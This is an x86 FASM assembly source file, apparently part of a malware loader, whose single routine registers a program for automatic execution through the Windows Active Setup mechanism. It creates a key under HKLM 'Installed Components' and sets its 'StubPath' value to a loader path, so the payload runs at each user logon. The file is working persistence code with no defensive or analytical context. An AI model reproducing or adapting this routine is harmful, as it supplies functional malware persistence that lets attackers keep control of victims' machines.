include '../include/global.inc'
include 'win32a.inc'

use32

FUNCTION_DATA_BEGIN add_startup_activex_x86

proc add_startup_activex_x86 stdcall uses ebx esi edi, global_data: dword
	locals
		root    _HKEY    ?
		stub    _HKEY    ?
		tempkey _WCHAR   10	dup(?)
	endl

	mov esi, [global_data]

	assume esi: global_data_t

	lea eax, [root]
	push eax
	push dword KEY_ALL_ACCESS
	push 0
	PUSH_ANSI_STRING 'SOFTWARE\Microsoft\Active Setup\Installed Components'
	push dword HKEY_LOCAL_MACHINE
	invoke esi.RegOpenKeyExA
	test eax, eax
	jnz .error_exit

	lea ecx, [esi.activex_name]
	lea eax, [stub]
	invoke esi.RegCreateKeyExW, [root], ecx, 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, eax, 0
	test eax, eax
	jz .success

	invoke esi.RegCloseKey, [root]
	jmp .error_exit

.success:
	; windows底层有检查字符串的对齐，对齐不正确的话会报错, 所以这里拷贝到堆栈里
	lea ebx, [tempkey]
	invoke esi.RtlZeroMemory, ebx, 10 * 2
	
	PUSH_WIDE_STRING 'StubPath'
	push ebx
	invoke esi.lstrcpyW

	lea edi, [esi.loader_path]
	invoke esi.lstrlenW, edi
	add eax, 1
	shl eax, 1  ; len * 2

	invoke esi.RegSetValueExW, [stub], ebx, 0, REG_SZ, edi, eax

	invoke esi.RegCloseKey, [stub]
	invoke esi.RegCloseKey, [root]

.error_exit:
	ret
endp

FUNCTION_DATA_END add_startup_activex_x86